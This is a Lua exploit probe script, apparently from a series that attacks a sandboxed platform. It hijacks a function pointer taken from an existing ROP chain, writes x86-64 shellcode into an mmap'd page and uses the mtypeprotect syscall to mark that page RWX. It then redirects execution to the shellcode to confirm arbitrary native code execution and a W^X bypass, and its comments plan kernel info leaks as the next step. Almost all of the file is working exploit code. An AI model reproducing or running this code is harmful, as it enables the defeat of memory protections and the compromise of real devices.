-- CRASH_CLASS: HIGH (redirecting execution to shellcode page)
-- PROBE 44a: mtypeprotect + fn_addr execution test
--
-- 43h confirmed: mtypeprotect(585) returns ret=1 for RWX protection.
-- 43i confirmed: fn_addr writes persist across syscall calls.
-- This probe combines both: write shellcode to an mmap'd page,
-- call mtypeprotect to make it executable, then redirect fn_addr
-- to the shellcode page and trigger execution via a syscall call.
--
-- Shellcode strategy: simple "mov eax, 0x41414141; ret" — if eax
-- comes back as 0x41414141, we have arbitrary native code execution.
-- Also test: "mov eax, 20; syscall; ret" (getpid via direct syscall).
--
-- If this works: W^X is bypassed, no more ROP-only restriction.
-- We can then execute kernel info leak code directly.

print("=== PROBE 44a: MTYPEPROTECT EXECUTION TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Get fn_addr pointer from ROP chain
--------------------------------------------------------------------
print("")
print("=== A: LOCATE FN_ADDR ===")
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

if not fn_str then
    print("FATAL: cannot parse fn_addr from pipe string")
    return
end

local fn_ptr = uint64(fn_str)
print("fn_addr ptr: " .. fn_str)
print("ropchain: " .. (rop_str or "unknown"))

local fn_orig = safe_rq(fn_ptr)
if not fn_orig then
    print("FATAL: cannot read fn_addr")
    return
end
print("fn_addr original: " .. qw_hex(fn_orig))

--------------------------------------------------------------------
-- B) Allocate page and write shellcode
--------------------------------------------------------------------
print("")
print("=== B: SHELLCODE PAGE ===")
local page_size = 0x4000
local page
pcall(function()
    page = sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not page then
    print("FATAL: mmap failed")
    return
end
print("page addr: " .. qw_hex(page))

-- Shellcode 1: mov eax, 0x41414141; ret
-- B8 41 41 41 41 C3
memory.write_byte(page, 0xB8)
memory.write_byte(page + 1, 0x41)
memory.write_byte(page + 2, 0x41)
memory.write_byte(page + 3, 0x41)
memory.write_byte(page + 4, 0x41)
memory.write_byte(page + 5, 0xC3)
print("shellcode1 written: B8 41414141 C3 (mov eax,0x41414141; ret)")

-- Verify
local v = safe_rd(page)
print(string.format("verify: %08X", v or 0))

-- Shellcode 2 at page+0x100: xor eax,eax; mov al,20; ret
-- 31 C0 B0 14 C3
memory.write_byte(page + 0x100, 0x31)
memory.write_byte(page + 0x101, 0xC0)
memory.write_byte(page + 0x102, 0xB0)
memory.write_byte(page + 0x103, 0x14)
memory.write_byte(page + 0x104, 0xC3)
print("shellcode2 at +0x100: 31C0 B014 C3 (xor eax,eax; mov al,20; ret)")

-- Shellcode 3 at page+0x200: nop sled + ret (safe test)
-- 90 90 90 90 C3
for i = 0, 15 do
    memory.write_byte(page + 0x200 + i, 0x90)
end
memory.write_byte(page + 0x210, 0xC3)
print("shellcode3 at +0x200: NOP sled + ret (safest test)")

--------------------------------------------------------------------
-- C) Call mtypeprotect to make page executable
--------------------------------------------------------------------
print("")
print("=== C: MTYPEPROTECT TO RWX ===")

-- Try 3-arg form: mtypeprotect(addr, len, prot=RWX=7)
local ok, ret = pcall(function()
    return sc_mtypeprotect(uint64(page), uint64(page_size), uint64(7))
end)
local rv = ok and to_num(ret) or -999
print(string.format("mtypeprotect(RWX, 3-arg): ret=%d", rv))

-- Also try 4-arg form: mtypeprotect(addr, len, old=3, new=7)
ok, ret = pcall(function()
    return sc_mtypeprotect(uint64(page), uint64(page_size), uint64(3), uint64(7))
end)
rv = ok and to_num(ret) or -999
print(string.format("mtypeprotect(RW->RWX, 4-arg): ret=%d", rv))

-- Verify page is still readable/writable after mtypeprotect
local still_readable = safe_rd(page)
print(string.format("still readable: %s", still_readable and "YES" or "NO"))
local still_writable = safe_wd(page + 0x300, 0xBEEF)
print(string.format("still writable: %s", still_writable and "YES" or "NO"))

--------------------------------------------------------------------
-- D) EXECUTION TEST 1: NOP sled (safest)
--------------------------------------------------------------------
print("")
print("=== D: EXECUTION TEST 1 - NOP SLED ===")
print("redirecting fn_addr to NOP sled at page+0x200...")

-- Save original, write shellcode address
safe_wq(fn_ptr, page + 0x200)

-- Verify the write
local fn_check = safe_rq(fn_ptr)
print("fn_addr now: " .. qw_hex(fn_check))

-- Try calling getpid - if page is executable, NOP sled runs and returns
local exec_ok, exec_ret = pcall(function()
    return sc_getpid()
end)
local exec_rv = exec_ok and to_num(exec_ret) or -999
print(string.format("nop_sled result: ok=%s ret=%d (0x%X)", tostring(exec_ok), exec_rv, exec_rv >= 0 and exec_rv or 0))

if exec_ok then
    print("*** PAGE IS EXECUTABLE! NOP SLED SURVIVED! ***")

    -- Restore fn_addr for next test
    safe_wq(fn_ptr, fn_orig)

    ----------------------------------------------------------------
    -- E) EXECUTION TEST 2: mov eax, 0x41414141; ret
    ----------------------------------------------------------------
    print("")
    print("=== E: EXECUTION TEST 2 - MOV EAX ===")
    safe_wq(fn_ptr, page)
    local ok2, ret2 = pcall(function()
        return sc_getpid()
    end)
    local rv2 = ok2 and to_num(ret2) or -999
    print(string.format("mov_eax result: ok=%s ret=%d (0x%X)", tostring(ok2), rv2, rv2 >= 0 and rv2 or 0))

    if ok2 and rv2 == 0x41414141 then
        print("*** ARBITRARY NATIVE CODE EXECUTION CONFIRMED ***")
        print("*** W^X IS COMPLETELY BYPASSED ***")
    elseif ok2 then
        print("executed but unexpected return value")
    end

    -- Restore
    safe_wq(fn_ptr, fn_orig)

    ----------------------------------------------------------------
    -- F) EXECUTION TEST 3: actual getpid syscall from shellcode
    ----------------------------------------------------------------
    print("")
    print("=== F: EXECUTION TEST 3 - DIRECT SYSCALL ===")

    -- Write: mov eax, 20; syscall; ret
    -- B8 14 00 00 00 0F 05 C3
    memory.write_byte(page + 0x400, 0xB8)
    memory.write_byte(page + 0x401, 0x14)
    memory.write_byte(page + 0x402, 0x00)
    memory.write_byte(page + 0x403, 0x00)
    memory.write_byte(page + 0x404, 0x00)
    memory.write_byte(page + 0x405, 0x0F)
    memory.write_byte(page + 0x406, 0x05)
    memory.write_byte(page + 0x407, 0xC3)

    safe_wq(fn_ptr, page + 0x400)
    local ok3, ret3 = pcall(function()
        return sc_getpid()
    end)
    local rv3 = ok3 and to_num(ret3) or -999
    print(string.format("syscall result: ok=%s ret=%d", tostring(ok3), rv3))

    if ok3 and rv3 == pid then
        print("*** DIRECT SYSCALL EXECUTION WORKS ***")
        print("*** CAN NOW EXECUTE ANY SYSCALL WITHOUT ROP ***")
    elseif ok3 then
        print(string.format("returned %d, expected pid=%d", rv3, pid))
    end

    safe_wq(fn_ptr, fn_orig)
else
    print("execution CRASHED - page not executable (mtypeprotect did not work)")
    print("crash is expected if mtypeprotect only changes type metadata, not actual MMU flags")
end

--------------------------------------------------------------------
-- G) Restore and cleanup
--------------------------------------------------------------------
print("")
print("=== G: CLEANUP ===")
-- Make sure fn_addr is restored
safe_wq(fn_ptr, fn_orig)
local fn_final = safe_rq(fn_ptr)
print("fn_addr restored: " .. qw_hex(fn_final))

-- Verify getpid still works
local ok_final, ret_final = pcall(function() return sc_getpid() end)
print(string.format("getpid after restore: ok=%s ret=%d", tostring(ok_final), ok_final and to_num(ret_final) or -999))

pcall(function() sc_munmap(page, uint64(page_size)) end)

print("")
print("=== PROBE 44a COMPLETE ===")
